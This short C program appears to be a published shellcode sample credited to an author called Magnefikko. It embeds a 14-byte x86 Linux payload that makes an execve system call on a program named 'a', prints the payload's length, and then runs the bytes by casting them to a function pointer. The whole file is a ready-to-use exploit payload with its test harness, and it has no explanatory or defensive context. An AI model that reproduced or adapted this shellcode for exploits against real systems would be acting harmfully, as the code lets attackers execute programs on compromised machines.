int main(){
    char shell[] = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80";
    printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell) = %d\n", strlen(shell));
    (*(void (*)()) shell)();
}